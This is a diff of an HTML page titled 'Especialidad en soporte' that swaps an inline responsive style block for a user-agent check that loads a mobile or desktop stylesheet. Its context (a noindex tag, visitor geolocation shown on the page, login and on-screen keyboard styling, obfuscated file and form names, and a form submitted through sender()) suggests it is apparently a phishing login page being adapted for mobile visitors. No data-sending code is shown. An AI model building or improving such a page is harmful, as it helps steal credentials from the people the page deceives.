@@ -3,7 +3,7 @@
 <head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=10">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- 📱 Ajuste responsive -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Especialidad en soporte</title>
   <meta name="robots" content="noindex, nofollow">
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
@@ -13,66 +13,21 @@
       $("#address").html("" + data.city + ", " + data.country);
     })
   </script>
-  <link type="text/css" href="css/jquery.css" rel="stylesheet">
-  <link href="css/dropeandola.css" rel="stylesheet" type="text/css">
-  <link href="css/jquery(1).css" type="text/css" rel="stylesheet">
-  <link href="css/locot3x.css" type="text/css" rel="stylesheet">
 
-  <!-- 📱 CSS responsive -->
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
+  <!-- 📌 Aquí el truco -->
+  <script>
+    // Detecta si es móvil (Android, iOS, etc.)
+    if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+      // Si es móvil → carga tu CSS responsive
+      document.write('<link href="css/mobile.css" rel="stylesheet" type="text/css">');
+    } else {
+      // Si es PC → carga el CSS original
+      document.write('<link type="text/css" href="css/jquery.css" rel="stylesheet">');
+      document.write('<link href="css/dropeandola.css" rel="stylesheet" type="text/css">');
+      document.write('<link href="css/jquery(1).css" type="text/css" rel="stylesheet">');
+      document.write('<link href="css/locot3x.css" type="text/css" rel="stylesheet">');
     }
-
-    .contenedorgenerico {
-      max-width: 100%;
-      padding: 10px;
-    }
-
-    img {
-      max-width: 100%;
-      height: auto;
-    }
-
-    .tabla-login, 
-    .subtabla-login, 
-    .subtabla-login-campos {
-      width: 100% !important;
-      display: block;
-    }
-
-    .tabla-login td, 
-    .subtabla-login td {
-      display: block;
-      width: 100% !important;
-    }
-
-    .btn_blue {
-      width: 100% !important;
-      padding: 12px;
-      font-size: 16px;
-      border-radius: 6px;
-    }
-
-    .links_step1 {
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      margin-top: 12px;
-    }
-
-    /* Ajustes en pantallas pequeñas */
-    @media (max-width: 600px) {
-      .logo-ban {
-        text-align: center;
-        margin-bottom: 20px;
-      }
-      .tabla-login-teclado {
-        width: 100% !important;
-      }
-    }
-  </style>
+  </script>
 </head>
 <body class="top" >
   <form id="lacr4dso" onsubmit="return sender()">
